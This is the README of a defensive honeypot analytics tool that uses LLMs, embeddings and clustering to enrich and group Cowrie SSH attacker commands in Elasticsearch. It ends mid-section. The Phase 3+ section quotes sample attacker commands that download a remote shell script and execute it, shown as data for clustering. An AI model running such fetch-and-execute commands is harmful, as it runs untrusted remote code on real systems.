# DShield Vector-Based Long-Tail Log Analysis

Vectorize the noise. Surface the novel.

---

## Overview

DShield honeypot sensors capture a lot of attacker activity, most of which is commodity scanning and known-payload noise. The interesting things (first-seen techniques, niche reconnaissance, evolving campaigns, etc) sit in the long tail and are easily lost or otherwise missed.

This project adds an offline analysis layer which:

1. **Reads** DShield logs which have been ingested into SecurityOnion-managed Elasticsearch indices (read-only, never modifies the original log data).
2. **Deduplicates** repeated payloads by hashing the normalized event text. Common bot commands collapse into one doc to keep the long tail distinct.
3. **Enriches** each unique payload with a local LLM: attack description, MITRE ATT&CK tactic / technique IDs, IOC extraction, intent classification, and a self-rated confidence score.
4. **Embeds** each payload into a 768-dimensional vector for similarity search and clustering.
5. **Writes** the result to separate, project-owned, ECS-compliant indices that can be queried, joined back to their associated log events, and pivoted on without risking the original logs.

Output is structured, timestamped, and queryable the same way any other ECS data on the box. The current scope is Cowrie SSH honeypot data. The field-namespace convention (`dshield.<source>.enrichment.*`) is designed to extend to other DShield log sources later.

## Intended environment

- A small-to-medium DShield sensor
- A SecurityOnion 2.x box doing the SIEM work, with the cowrie ingest pipeline from `es-pipelines/cowrie-pipeline.yml` already in place (While designed to run on SecurityOnion, this should work on any ElasticSearch stack).
- A separate machine with a GPU or NPU (8 GB VRAM fits a 7B Q4 generation model + 768-dim embedding model side by side) running either Ollama or an OpenAI-compatible equivalent.

## Roadmap

| Phase | Status | What it adds |
|---|---|---|
| **1 - Command enrichment (local LLM)** | implemented | Per-unique-command doc with description, intent, MITRE IDs, IOCs, embedding, confidence. SQLite cache + watermark for incremental runs |
| **2 - Cloud escalation** | implemented | Selectively route hard / novel / low-confidence commands to Claude for better labels. Daily $$ budget cap. Triage reasons logged on each escalated doc |
| **3 - Clustering + novelty** | implemented | HDBSCAN over command embeddings; populates `dshield.cowrie.enrichment.cluster.{id, novelty_score, is_outlier}`. "Show me everything weird this week" becomes one query. Also feeds the `novel_embedding` triage rule in Phase 2 |
| **3+ - Smarter embeddings + scalar augmentation** | implemented | Embedding is now the final step (after all LLM calls). Embed text includes LLM-generated context (intent, tactic IDs, technique IDs, description) prepended to the raw command. Four behavioral scalars (occurrence count, unique source IPs, LLM confidence, session reuse rate) are appended to the HDBSCAN matrix as a weighted block. `embed_version` in cache key; `reembed` command to update vectors without re-running the LLM |
| **4 - Session + IP rollup, clustering, playbook naming, campaign mining** | implemented | One doc per completed session (mean-pooled command embedding, behavioral stats, cluster ID, novelty score). One doc per source IP (aggregated across sessions, own embedding + clustering). The LLM names each session cluster — a **playbook** — with a short label ("XMRig mining dropper", "Mirai botnet variant", etc.). Frequent-itemset + shared-artifact miners then identify multi-session **campaigns** spanning multiple playbooks/IPs. See [`docs/PLAYBOOKS_AND_CAMPAIGNS.md`](docs/PLAYBOOKS_AND_CAMPAIGNS.md). |
| **5 - Eval + monitoring** | planned | Hand-labeled regression set; weekly F1 against ground truth; structured worker logs to ES; alerts on budget / drift / failure rate |

---

## Quickstart

**First-time install** on a SecurityOnion box (after filling `.env` + `config/local.yaml`, and after standing up your LLM server per [step 1](#1-gpu-box--install-your-llm-server)):

```bash
sudo bash scripts/setup-security-onion-node.sh
```

The script handles user creation, deploy to `/opt/dshield_prism`, venv + install, healthcheck, index creation, and systemd enablement. It's fully idempotent — safe to re-run after fixing anything. See [Automated setup](#automated-setup-script) for flags. For the manual step-by-step (or to understand what the script does), see the [Setup guide](#setup-guide--step-by-step).

**Daily / recurring use:**

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli healthcheck
sudo -u dshield_prism .venv/bin/python -m enrich.cli enrich --dry-run
sudo -u dshield_prism .venv/bin/python -m enrich.cli enrich
```

**Recovery / re-scan everything:**
```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli reset --yes
sudo -u dshield_prism .venv/bin/python -m enrich.cli enrich
```

**Investigation console.** A standalone, read-only browser GUI lives in [`console/`](console/). It reads the same Elasticsearch indices this pipeline writes and lets you search any IOC (IP, session ID, command sha256, playbook name, campaign name, MITRE ID, …) and pivot through the resulting graph. Install and run instructions: [`console/README.md`](console/README.md).

---

## Architecture

```
+-------------------------+        +---------------------------------+
|   GPU box               |        |   SecurityOnion box             |
|   Ollama OR LM Studio   | <----- |   dshield_prism       |
|   - 7B instruct model   | (LAN)  |   (this project)                |
|   - 768-dim embed model |        |   - systemd timer               |
+-------------------------+        |   - SQLite state                |
                                   |   - reads SO events             |
                                   |   - writes enriched ix          |
                                   +---------------------------------+
                                              |
                                              v
                                   +---------------------------------+
                                   |   Elasticsearch (SO)            |
                                   |   read:  logs-...cowrie...-*    |
                                   |   write: enriched / rollup /    |
                                   |          clusters indexes       |
                                   +---------------------------------+
```

The worker only **reads** from the SO-managed Cowrie events index. All enrichment, rollup, and cluster data is written to separate, project-owned indexes (six per source: commands, command-clusters, sessions, session-clusters, IPs, IP-clusters).

---

## Repository contents

| Path | Purpose |
|---|---|
| `pyproject.toml` | Python package + dependencies (`[cluster]` extra for Phase 3+) |
| `config/default.yaml` | Default worker config (committed) |
| `config/local.yaml.example` | Template for per-deploy overrides — copy to `local.yaml` (gitignored) |
| `config/prompts/command_enrichment.txt` | Local-LLM command-classification prompt |
| `config/prompts/command_deep_dive.txt` | Cloud-LLM deep-dive prompt used during escalation |
| `config/prompts/playbook_name.txt` | LLM prompt for naming each session-cluster playbook |
| `src/enrich/` | Python package: `cli`, `config`, `cache`, `es_client`, `clustering`, `healthcheck`, `triage`, `llm/{ollama,openai_compat,anthropic,schemas}`, plus `sources/cowrie/{commands,sessions,ips,campaigns}.py` (one module per layer) |
| `es-mappings/cowrie/commands.json` | Settings + ECS-compliant mappings for the per-command enrichment index |
| `es-mappings/cowrie/command_clusters.json` | Settings + mappings for the command cluster centroids index (Phase 3) |
| `es-mappings/cowrie/sessions.json` | Settings + mappings for the session rollup index (Phase 4) |
| `es-mappings/cowrie/session_clusters.json` | Settings + mappings for session cluster centroids index (Phase 4) |
| `es-mappings/cowrie/ips.json` | Settings + mappings for the IP rollup index (Phase 4b) |
| `es-mappings/cowrie/ip_clusters.json` | Settings + mappings for IP cluster centroids index (Phase 4b) |
| `es-mappings/cowrie/campaigns.json` | Settings + mappings for the multi-session campaigns index (mined by `mine campaigns`) |
| `es-dashboards/command-enrichment-dashboard.ndjson` | Importable Kibana dashboard: Command Enrichment (Phase 1-3) |
| `es-dashboards/session-analysis.ndjson` | Importable Kibana dashboard: Session Behavior Analysis (Phase 4) |
| `console/` | Standalone, read-only investigation GUI (FastAPI + Cytoscape.js) — see [`console/README.md`](console/README.md) |
| `docs/pipeline.md` | Mermaid flowcharts of the full enrichment / rollup / clustering pipeline |
| `docs/PLAYBOOKS_AND_CAMPAIGNS.md` | Reference doc for the two higher-level abstractions over the raw stream |
| `systemd/dshield_prism-ingest.service` + `.timer` | Hourly oneshot: `enrich` + `rollup sessions` |
| `systemd/dshield_prism-analytics.service` + `.timer` | 6-hourly oneshot: `cluster commands` + `escalate` + `cluster sessions` + `name playbooks` + `rollup ips` + `cluster ips` + `mine campaigns` |
| `scripts/setup-security-onion-node.sh` | One-shot, idempotent SO-box installer |
| `.env.example` | Secrets template (copy to `.env`) |
| `.gitignore` | Excludes `.env`, `config/local.yaml`, `config/local.yml`, `*.sqlite`, `__pycache__` |

---

## CLI commands

All run as the service user from the install dir:

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli <subcommand>
```

The CLI groups verbs by layer: `<verb> [<layer>] [--source <source>]`. Every layer-bearing verb accepts `--source` (default `cowrie`), so adding a new sensor in the future is a sibling module under `sources/<source>/` rather than a new verb.

| Subcommand | What it does |
|---|---|
| `healthcheck` | Verify ES + LLM server + models + SQLite + cloud. Exits non-zero on failure. |
| `healthcheck --scope <s>` | Run a subset. Comma-separated; valid: `es`, `llm`, `sqlite`, `cloud-conn`, `cloud`, or `all` (default). **Default / `all` runs the *cheap* cloud check (`cloud-conn`)** — `GET /v1/models` against Anthropic, zero generation tokens — so scripts, timers, and the setup runner can call `healthcheck` without burning budget. The full `cloud` scope (~16-token round-trip + budget readout) is **opt-in for user troubleshooting only**: `healthcheck --scope cloud`. Output is `[ok]` / `[warn]` / `[FAIL]` lines plus a summary, suitable for `ExecStartPre` gating — the systemd unit uses `--scope llm` so only a local-LLM outage blocks `enrich`. Cloud reachability is preflighted inside `enrich` itself (Anthropic `ping`); on failure the run degrades to local-only and logs a warning rather than failing. |
| `init-indexes` | `PUT` every index for the source (default `cowrie`) with explicit ECS settings + mappings from `es-mappings/<source>/*.json`. Idempotent — already-existing indexes are no-ops. |
| `init-indexes --layer <name>` | Init a single layer. Valid layers: `commands`, `command_clusters`, `sessions`, `session_clusters`, `ips`, `ip_clusters`, `campaigns`. |
| `init-indexes --update-mapping` | If an index exists, push **additive** mapping changes (new fields). Cannot change existing field types. Combine with `--layer` to scope. |
| `enrich` | Phase 1: one enrichment pass — read new command events, dedup, LLM-classify, embed, bulk-write, advance command watermark. |
| `enrich --dry-run` | Read + group events, print stats; skip LLM and writes. |
| `enrich --no-cloud` | Force-disable Phase 2 cloud escalation for this run, even if `cloud.enabled=true` in config. |
| `cluster commands` | Phase 3: pull all command embeddings, run HDBSCAN, compute novelty scores, bulk-update cluster fields on every command doc, write centroid docs to the command-clusters index. |
| `cluster sessions` | Phase 4: HDBSCAN over session embeddings (augmented with session-level scalars). Writes `dshield.cowrie.enrichment.session.cluster.*` to each session doc and centroid docs to the session-clusters index. Requires `.[cluster]` extras. |
| `cluster ips` | Phase 4b: HDBSCAN over IP embeddings (augmented with IP-level scalars). Writes `dshield.cowrie.enrichment.ip.cluster.*` to each IP doc and centroid docs to the IP-clusters index. Requires `.[cluster]` extras. |
| `cluster <layer> --dry-run` | Fetch + cluster without writing anything to ES. Prints stats (`n_clusters`, `n_outliers`, runtime). |
| `reembed` | Re-embed all command docs using their stored enrichment fields (intent, tactics, techniques, description) — no LLM generation. Use after changing `llm.embed_context` or bumping `llm.embed_version`. Updates the SQLite cache to the new `embed_version` so the next `enrich` run skips the LLM for already-enriched commands. Follow with `cluster commands` to rebuild centroids from the new vectors. |
| `reembed --dry-run` | Count docs that would be re-embedded without calling the embedding model or writing to ES. |
| `escalate` | Cloud-escalate locally-enriched docs where `novelty_score ≥ novel_embedding_threshold` AND `confidence ≤ escalate_confidence_max`. Queries ES directly — no watermark, no cache — so it catches docs enriched in any previous run. Already cloud-enriched docs are never re-escalated. Run after each `cluster commands` pass. |
| `escalate --dry-run` | Count candidates matching both filters without making cloud calls or writes. |
| `rollup sessions` | Phase 4: for each completed session (`cowrie.session.closed`) since the session watermark, aggregate all events for that session, join with command enrichment docs, mean-pool command embeddings into a session embedding, and write one doc per session to the sessions-rollup index. Idempotent — sessions are indexed by `_id = session_id`. Sessions with no yet-enriched commands write a partial doc (no embedding) and are updated automatically on the next rollup run after `enrich` has processed their commands. |
| `rollup ips` | Phase 4b: incremental — finds IPs whose sessions changed since the last run, then fetches all sessions for each affected IP and builds one IP rollup doc (mean-pooled session embedding, aggregated behavioral stats, geo/ASN from the session docs). Idempotent — IP docs are indexed by `_id = source.ip`. Requires `rollup sessions` to have run first. |
| `rollup <layer> --dry-run` | Count rollup candidates without writing docs. |
| `name playbooks` | Names each non-outlier session cluster — a **playbook**. Samples session IDs, fetches their top commands, names the cluster via the local LLM, writes `playbook_id` + `playbook_name` to the session-clusters centroid and back-fills both onto every member session doc. |
| `name playbooks --dry-run` | Show candidate clusters and command samples without calling the LLM. |
| `name playbooks --force` | Re-name clusters that already have a `playbook_name`. |
| `mine campaigns --kind {behaviour\|infrastructure\|all}` | Discover multi-session campaigns. `behaviour` runs FP-growth-style itemset mining over per-IP playbook bags; `infrastructure` builds a session-session graph through shared artifacts (URLs / SSH keys / file hashes from raw cowrie events) and emits each connected component as a campaign. Writes to the `campaigns-dshield.cowrie-default` index. See [`docs/PLAYBOOKS_AND_CAMPAIGNS.md`](docs/PLAYBOOKS_AND_CAMPAIGNS.md). |
| `mine campaigns --dry-run` | Mine and report stats without writing campaign docs. |
| `pipeline` | Run every processing stage in order — `enrich` → `rollup sessions` → `cluster commands` → `escalate` → `cluster sessions` → `name playbooks` → `rollup ips` → `cluster ips` → `mine campaigns`. Optional steps (escalate / name / mine) tolerate failure; mandatory steps halt the chain. `--continue-on-error` extends tolerance to every step. `--no-cloud` propagates to `enrich`. |
| `pipeline --force --yes` | **Destructive.** Before running, deletes every processed ES index (commands, command_clusters, sessions_rollup, session_clusters, ips_rollup, ip_clusters, campaigns), recreates them from their mappings, and clears the SQLite cache + watermark. The raw `sessions_raw` index is left alone. `--yes` skips the confirmation prompt. |
| `pipeline --dry-run` | Print the step plan and pass `--dry-run` to each step. With `--force` also prints what would be wiped without wiping. |
| `budget` | Print today's cloud-LLM spend, daily cap, calls, token totals (Phase 2). |
| `reset` | Clear local SQLite state. Default: cache + watermark. Flags: `--cache`, `--watermark`, `--all`, `--yes` (skip confirmation). **Clears the command watermark only** — session and IP watermarks are separate keys in the same table and are NOT cleared by `reset`. See [Phase 4 — operational notes](#phase-4--operational-notes) for how to reset them individually. Does NOT touch ES. |

**Playbook naming uses the local LLM only.** `name playbooks` calls `generate_json(prompt, ...)` against the local LLM and never escalates to cloud, regardless of `cloud.enabled`. Reason: the output is 3-5 words and naming consistency across runs matters more than per-call quality. Prompt template: `config/prompts/playbook_name.txt`. The multi-session `mine campaigns` step is purely algorithmic — no LLM involvement.

---

## Automated setup script

`scripts/setup-security-onion-node.sh` performs steps 2-9 of the manual guide below.

**Prerequisites** before running:
- Source folder is on the SO box (any path).
- `config/local.yaml` (or `local.yml`) is filled in.
- `.env` is filled in.
- The GPU-side LLM server (step 1) is reachable from this box.

**Run:**
```bash
sudo bash scripts/setup-security-onion-node.sh
```

**Flags:**
| Flag | Effect |
|---|---|
| `--no-systemd` | Skip installing/enabling the timers |
| `--skip-healthcheck` | Continue past a failed healthcheck (NOT recommended) |
| `--skip-init-index` | Don't run `init-indexes` |
| `-h` / `--help` | Print the embedded usage block |

**Environment overrides:**
| Var | Default |
|---|---|
| `SERVICE_USER` | `dshield_prism` |
| `INSTALL_DIR` | `/opt/dshield_prism` |
| `STATE_DIR` | `/var/lib/dshield_prism` |
| `SYSTEMD_DIR` | `/etc/systemd/system` |
| `PYTHON_BIN` | `python3` |

The script is idempotent — re-run it after editing config or fixing healthcheck failures.

The first enrichment and cluster runs are **not** triggered by the script (enrich can take hours on a backlog). Run them manually:
```bash
sudo -u dshield_prism /opt/dshield_prism/.venv/bin/python \
    -m enrich.cli enrich --dry-run
sudo -u dshield_prism /opt/dshield_prism/.venv/bin/python \
    -m enrich.cli enrich

# After the first successful enrich, seed the cluster index:
sudo -u dshield_prism /opt/dshield_prism/.venv/bin/python \
    -m enrich.cli cluster
sudo -u dshield_prism /opt/dshield_prism/.venv/bin/python \
    -m enrich.cli escalate   # only if cloud.enabled=true
```

---

## Setup guide — step by step

### 0. Prerequisites

- A GPU box reachable from the SecurityOnion (SO) box on the LLM server's port.
- SecurityOnion 2.x box with shell access.
- Python 3.11+ on the SO box.
- An Elasticsearch user with `read` on the Cowrie events index pattern, and `manage` / `read` / `write` on every project-owned index (defaults: `enriched-dshield.cowrie.command-default`, `clusters-dshield.cowrie.command-default`, `rollup-dshield.cowrie.session-default`, `clusters-dshield.cowrie.session-default`, `rollup-dshield.cowrie.source_ip-default`, `clusters-dshield.cowrie.source_ip-default`). The simplest grant is `manage` / `read` / `write` on `enriched-dshield.cowrie.*`, `rollup-dshield.cowrie.*`, `clusters-dshield.cowrie.*`.
- The actual Cowrie events index name from your SO deploy (find it in step 5).

### 1. GPU box — install your LLM server

The worker is currently compatible with both ollama and OpenAI via the `llm.provider` config field.

#### Option A — Ollama

`local.yaml` snippet:
```yaml
llm:
  provider: "ollama"
  base_url: "http://GPU_IP:11434"
  generation_model: "qwen2.5:7b-instruct-q4_K_M"
  embedding_model: "nomic-embed-text"
```

#### Option B — LM Studio

1. Load a 7B-class instruct model (e.g. `qwen2.5-7b-instruct`) and a **768-dim** embedding model (e.g. `text-embedding-nomic-embed-text-v1.5`).
2. Server tab → enable, bind on `0.0.0.0`, note the port.
3. Smoke test: `curl http://GPU_IP:PORT/v1/models`

`local.yaml` snippet:
```yaml
llm:
  provider: "openai_compat"
  base_url: "http://GPU_IP:PORT"
  generation_model: "qwen2.5-7b-instruct"
  embedding_model: "text-embedding-nomic-embed-text-v1.5@q8_0"
  # api_key: "lm-studio"   # only if "Require API Key" is enabled
```

### 2. SO box — create the worker user

```bash
sudo useradd --system --home /opt/dshield_prism --shell /usr/sbin/nologin dshield_prism
sudo mkdir -p /opt/dshield_prism /var/lib/dshield_prism
sudo chown -R dshield_prism:dshield_prism /opt/dshield_prism /var/lib/dshield_prism
```

### 3. SO box — deploy this folder

Clone this repo to your SecurityOnion node, to /opt/dshield_prism

### 4. SO box — Python venv + install

```bash
cd /opt/dshield_prism
sudo -u dshield_prism python3 -m venv .venv
sudo -u dshield_prism .venv/bin/pip install --upgrade pip
sudo -u dshield_prism .venv/bin/pip install -e .
```

### 5. SO box — configure

All per-deploy values (LLM URL, ES hosts, index names, paths) live in `config/local.yaml` (gitignored). `config/default.yaml` ships safe defaults; `local.yaml` overrides on top via deep-merge. The loader also accepts `local.yml`. Secrets live in `.env`.

```bash
cd /opt/dshield_prism
sudo -u dshield_prism cp config/local.yaml.example config/local.yaml
sudo -u dshield_prism cp .env.example              .env

# At minimum set: llm.{provider,base_url}, elasticsearch.indexes.cowrie.sessions_raw
sudo -u dshield_prism $EDITOR config/local.yaml

# Set ES credentials (ES_USERNAME/ES_PASSWORD or ES_API_KEY)
sudo -u dshield_prism $EDITOR .env
sudo chmod 600 .env config/local.yaml
```

Do NOT edit `config/default.yaml` for deployment values — it's tracked in VCS. Override in `local.yaml`.

> **Find your Cowrie events index name.** It varies by SO deploy. In Kibana → Dev Tools:
> ```
> GET _cat/indices/*cowrie*?v&s=index
>
> GET <candidate-pattern>/_count
> { "query": { "term": { "event.action": "cowrie.command.input" } } }
> ```
> Use the pattern that returns `count > 0`. Common values: `logs-dshield.cowrie.session-default` or `logs-dshield.cowrie.session-*`.

### 6. SO box — create the enrichment indexes

The CLI does a plain `PUT <index>` with explicit ECS settings + mappings from `es-mappings/<source>/*.json` for each of the six per-source layers. Index names come from `elasticsearch.indexes.cowrie.*` in your config; defaults are in `config/default.yaml`.

```bash
# Create all six indexes for the cowrie source in one shot.
sudo -u dshield_prism .venv/bin/python -m enrich.cli init-indexes
# -> [{"index_created": "<name>", "layer": "commands", ...}, ...]
# Re-running is idempotent — already-existing indexes return action: "noop".
```

To init a single layer (e.g. when you only need Phase 1):

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli init-indexes --layer commands
```

For destructive mapping changes (changing field types — e.g. `confidence` float→byte), delete and recreate the affected index:
```bash
curl -k -u admin:PWD -X DELETE 'https://localhost:9200/<INDEX_NAME>'
sudo -u dshield_prism .venv/bin/python -m enrich.cli init-indexes --layer commands
sudo -u dshield_prism .venv/bin/python -m enrich.cli reset --yes
```

Manual / curl alternative when you can't use the CLI:
```bash
curl -k -u admin:PWD \
  -X PUT 'https://localhost:9200/<INDEX_NAME>' \
  -H 'Content-Type: application/json' \
  --data-binary @es-mappings/cowrie/commands.json
```

### 7. SO box — healthcheck

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli healthcheck
```

Expected (all `[ok]`):
```
[ok] ES 8.x.y at https://localhost:9200
[ok] enrichment index exists: <your commands index>
[ok] events index '<your sessions_raw pattern>' has N docs
[ok] LLM (openai_compat) at http://GPU_IP:PORT
[ok] model present: <generation_model>
[ok] model present: <embedding_model>
[ok] embedding works (dim=768)
[ok] SQLite writable at /var/lib/dshield_prism/state.sqlite, watermark=None
All checks OK
```

If `[FAIL] embedding dim X != 768`: pick a 768-dim embedding model OR change `dense_vector.dims` in `es-mappings/cowrie/commands.json` and recreate the index. Fix all failures before continuing.

### 8. First manual run (dry-run + real)

```bash
# Dry-run: read events, compute hashes, but skip LLM + writes
sudo -u dshield_prism .venv/bin/python -m enrich.cli enrich --dry-run

# Real run — backfills all historical command events
sudo -u dshield_prism .venv/bin/python -m enrich.cli enrich
```

The first run can take hours depending on history size and unique-command count. Stats print at the end:

```json
{
  "events_seen": 18234,
  "unique_commands": 412,
  "cache_miss": 412,
  "enriched_ok": 408,
  "enriched_failed": 4,
  "bulk_ok": 412
}
```

Subsequent runs only see new events past the watermark and hit the cache for repeats.

### 9. Install + enable systemd timer

```bash
sudo cp /opt/dshield_prism/systemd/dshield_prism-ingest.service /etc/systemd/system/
sudo cp /opt/dshield_prism/systemd/dshield_prism-ingest.timer   /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now dshield_prism-ingest.timer

# Verify
systemctl list-timers dshield_prism-ingest.timer
journalctl -u dshield_prism-ingest.service -n 200 --no-pager
```

### 10. Quick Kibana sanity

In Kibana, add an index pattern matching `elasticsearch.indexes.cowrie.commands` (default `enriched-dshield.cowrie.command-default*`, time field `@timestamp`).

Sample queries (KQL):
- `dshield.cowrie.enrichment.intent : "cryptomining"` — top miner droppers
- `dshield.cowrie.enrichment.confidence <= 5` — low-confidence (Phase 2 escalation candidates)
- `threat.technique.id : "T1059.004"` — Unix shell execution
- `threat.framework : "MITRE ATT&CK" and threat.tactic.id : "TA0011"` — C2 traffic
- Sort by `dshield.cowrie.enrichment.occurrence_count desc` — top-N commodity payloads
- IOC pivot (nested): `threat.indicator : { type : "url" }` then drill into `threat.indicator.url.full`

---

## Phase 2 — enabling cloud escalation

Off by default. Phase 1 must already be running and producing docs. To turn it on:

1. **Get an Anthropic API key** and add it to `.env`:
   ```
   ANTHROPIC_API_KEY=sk-ant-...
   ```
2. **Flip cloud on in `config/local.yaml`**:
   ```yaml
   cloud:
     enabled: true
     # model: "claude-sonnet-4-6"
     # daily_budget_usd: 5.0
   ```
3. **Push the additive mapping** so `triage_reasons`, `notes`, and `local_fallback.*` exist on the commands index:
   ```bash
   sudo -u dshield_prism .venv/bin/python -m enrich.cli init-indexes --update-mapping --layer commands
   ```
4. **Bump `worker.prompt_version`** (default `v4`) and `reset --cache --yes` if you want previously-cached commands re-evaluated through the new triage path.
5. **Healthcheck** — confirms Anthropic reachability + budget:
   ```bash
   sudo -u dshield_prism .venv/bin/python -m enrich.cli healthcheck
   ```
6. **Run** as normal. After a pass, `enrich` returns extra stats: `triaged`, `cloud_calls`, `cloud_input_tokens`, `cloud_output_tokens`, `cloud_cost_usd`, `cloud_skipped_budget`. Daily spend is also queryable via:
   ```bash
   sudo -u dshield_prism .venv/bin/python -m enrich.cli budget
   ```

**Triage rules** (any rule fires → escalate; recorded in `dshield.cowrie.enrichment.triage_reasons`):

| Rule code | When it fires |
|---|---|
| `low_confidence<=N` | Local model's `confidence` is at or below `cloud.triage.confidence_max` |
| `local_failed` | Local LLM returned invalid JSON twice |
| `base64_blob` | Command contains a base64-ish run ≥ `cloud.triage.base64_min_run` chars |
| `ip_literal` | An IPv4 literal appears in the command |
| `rare_tld` | A domain in the command uses a TLD listed in `cloud.triage.suspicious_tlds` |
| `novel_embedding` | Phase 3: fired by the `escalate` command (not `enrich`) — queries ES for locally-enriched docs whose stored `novelty_score` ≥ `cloud.triage.novel_embedding_threshold` and re-escalates them. During `enrich`, embedding is always the last step (after all LLM calls), so novelty distance is not computed at enrich time |
| `sample` | Random `cloud.triage.sample_rate` fraction (default 1%) — quality monitoring |
| `budget_exhausted` | Triage wanted to escalate but daily cap was already hit; no cloud call made |
| `cloud_parse_failed` | Cloud was called but returned unparseable JSON; doc keeps local fields |

**Cost control:** every cloud call's input + output tokens are converted to USD via `cloud.pricing.{input,output}_per_mtok` and tallied per UTC day in SQLite. Once the day's spend ≥ `cloud.daily_budget_usd`, further escalations are skipped (the doc still gets the local-only enrichment, with `triage_reasons: ["…", "budget_exhausted"]`). Update `pricing` if you change models — the defaults track Claude Sonnet 4.6 and may not match your model.

**Cache semantics:** a successful local-only enrichment is cached with key `(short_hash, generation_model, prompt_version, embed_version)`. A cloud rewrite of that same hash is also cached under the same key. `local_failed` results without a cloud rescue stay uncached so they retry next run. Bump `worker.prompt_version` when either LLM prompt changes; bump `llm.embed_version` when `llm.embed_context` changes (see Phase 3+).

---

## Phase 3 — clustering and novelty scoring

Phase 1 and 2 must already be running and producing docs with embeddings. Phase 3 is a separate, stateless job — it reads the commands index, clusters all embeddings with HDBSCAN, then writes novelty scores back. Run it periodically (every 6 hours is plenty at this volume).

### 1. Install cluster deps

```bash
sudo -u dshield_prism .venv/bin/pip install -e ".[cluster]"
```

This installs `numpy` and `scikit-learn` (which bundles HDBSCAN since 1.3). No Cython or compiler needed — both ship as pre-built wheels. No other changes required — the cluster deps are isolated to the `[cluster]` extra.

### 2. Create the command-clusters index

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli \
    init-indexes --layer command_clusters
```

Idempotent — safe to re-run. The command-clusters index stores one centroid doc per cluster per run plus a run-summary doc. Multiple runs accumulate; the worker always queries the latest run's centroids.

### 3. Dry-run to verify

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli cluster commands --dry-run
```

Expected output (no writes):
```json
{
  "run_id": "...",
  "docs_fetched": 412,
  "n_clusters": 14,
  "n_outliers": 38,
  "dry_run": true
}
```

If `docs_fetched` is 0, Phase 1 hasn't written any docs yet or `elasticsearch.indexes.cowrie.commands` is misconfigured.

### 4. Run for real

```bash
sudo -u dshield_prism .venv/bin/python -m enrich.cli cluster commands
```

Stats include `docs_updated`, `cluster_docs_written`, and `runtime_seconds`. After a successful run, every command doc has its `dshield.cowrie.enrichment.cluster.*` fields populated.

### 5. Schedule it

The setup script installs `dshield_prism-analytics.timer`, which runs the full analytics chain (`cluster commands` → `escalate` → `cluster sessions` → `name playbooks` → `rollup ips` → `cluster ips` → `mine campaigns`) every 6 hours at 00:00, 06:00, 12:00, and 18:00 UTC (with up to 5 minutes of random jitter). No cron entry needed.

To monitor it:
```bash
journalctl -fu dshield_prism-analytics.service
systemctl list-timers dshield_prism-analytics.timer
```

Every step except `cluster commands` is declared with a `-` prefix in the service unit so its failure (e.g. `cloud.enabled=false` for `escalate`, or `[cluster]` extras missing) does not fail the unit — `cluster commands` is required because every downstream step depends on its novelty scores.

`escalate` is also safe to re-run at any time: it only touches `event.provider: "local"` docs, so already cloud-escalated docs are never re-processed. If the daily budget is exhausted mid-run, it stops cleanly and picks up from the most novel remaining candidates next run.

### Kibana: long-tail dashboard queries

After Phase 3 runs, the following KQL queries work against your enrichment index:

```
# Most novel commands (long tail)
dshield.cowrie.enrichment.cluster.is_outlier : true

# Sort by novelty descending — pick out the unusual ones
# Sort field: dshield.cowrie.enrichment.cluster.novelty_score (desc)

# First-seen this week that are truly novel
event.start >= now-7d and dshield.cowrie.enrichment.cluster.novelty_score >= 0.7

# Commands belonging to the same cluster (all variations on one theme)
dshield.cowrie.enrichment.cluster.id : "cluster_3"

# Cluster overview: terms agg on cluster.id, metric = count, sub-agg = sample command
```

### novel_embedding triage rule

The `novel_embedding` triage rule is handled by the `escalate` command, not `enrich`. After each `cluster commands` run, `escalate` queries ES for locally-enriched docs whose `novelty_score` ≥ `cloud.triage.novel_embedding_threshold` (default `0.5`) and re-escalates them to Claude. This keeps embedding as the final step in `enrich` (after all LLM calls), avoiding a double-embed on escalated commands.

To tune the thresholds, edit `config/local.yaml`:
```yaml
cloud:
  triage:
    novel_embedding_threshold: 0.6   # enrich: escalate if novelty >= this
    escalate_confidence_max: 7       # escalate cmd: only re-triage if confidence <= this
```

Note the distinction: the `novel_embedding` rule in `enrich` fires on **novelty alone** (no confidence filter — the command is brand new and the local model may have classified it confidently but incorrectly). The `escalate` command adds the **confidence filter** so you don't burn budget re-triaging novel commands the local model was already very sure about.

### Cluster ID stability

HDBSCAN cluster IDs (`cluster_0`, `cluster_1`, …) are **run-scoped** — they may shift between runs as new data arrives. Use `cluster.id` for filtering within a snapshot, not as a stable identifier across time. The `scored_at` timestamp tells you which run produced the labels on a given doc.

---

## Phase 3+ — Smarter embeddings + scalar feature augmentation

Two additive improvements that tighten cluster quality without requiring new indexes or mapping changes.

###  Semantic Embedding (including context about the command in the embed)

**Problem:** the previous pipeline embedded the raw command *before* LLM enrichment. `wget http://x.sh | sh` and `curl http://y.sh | bash` are semantically identical but their raw text differs, so they could land in different clusters.

**What changed:** `enrich.py` now follows the order: local LLM → (if needed) cloud LLM → embed. Embedding is always the final step, so the stored vector always reflects the final enrichment output — cloud if escalated, local otherwise. The embed-text string prepends the enrichment fields before the raw command:

```
intent: execution. tactics: TA0002, TA0011.
Downloads and executes a shell script from a remote host via wget.
Command: wget http://192.168.1.1/setup.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s
```

If enrichment fails (`local_failed`), the fallback is the raw command — same as before.

**Config** (`config/default.yaml`, override in `local.yaml`):

```yaml
llm:
  embed_context:
    - intent
    - tactics
    - techniques
    - description
  embed_version: "v3"  # bump whenever embed_context changes
```

Set `embed_context: []` to revert to pre-Phase-3+ behavior (raw command only). Any change to `embed_context` must be accompanied by a bump to `embed_version` so cached docs are re-embedded. The co-occurrence siblings (see `cooccurrence:` block in `config/default.yaml`) are also appended to the embed input when `cooccurrence.embed_cooccurrence` is true — toggling that flag is another reason to bump `embed_version`.

**`embed_version` and the cache key:** `embed_version` is part of the enrichment cache key alongside `generation_model` and `prompt_version`. Existing cache rows created against an older version will be treated as cache misses on the first run with the new version.

**Migration** (run once when upgrading an existing deployment):

```bash
# Re-embed all docs using stored enrichment fields — no LLM calls.
# Updates SQLite cache entries to the new embed_version so next enrich skips the LLM.
sudo -u dshield_prism .venv/bin/python -m enrich.cli reembed

# Rebuild cluster centroids from the new vectors.
